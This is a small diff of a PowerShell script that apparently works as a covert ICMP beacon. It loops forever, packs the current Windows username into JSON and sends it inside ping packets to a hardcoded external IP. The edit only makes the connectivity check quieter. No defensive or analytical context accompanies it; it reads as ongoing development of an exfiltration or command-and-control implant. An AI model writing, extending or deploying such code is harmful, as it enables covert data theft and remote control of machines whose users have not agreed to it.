@@ -43,7 +43,7 @@ Function Stop-PreviousProcesses {
 Stop-PreviousProcesses
 $sleep = 10; $target = "104.248.16.121"
 while ($true) {
-    if (Test-Connection -computer $site -count 1 -quiet) {
+    if (Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet -ErrorAction SilentlyContinue) {
         $ICMPClient = New-Object System.Net.NetworkInformation.Ping
         $json = @{h=$env:USERNAME} | ConvertTo-Json
         $r=$ICMPClient.Send($target, 10, ([text.encoding]::ASCII).GetBytes($json)) 
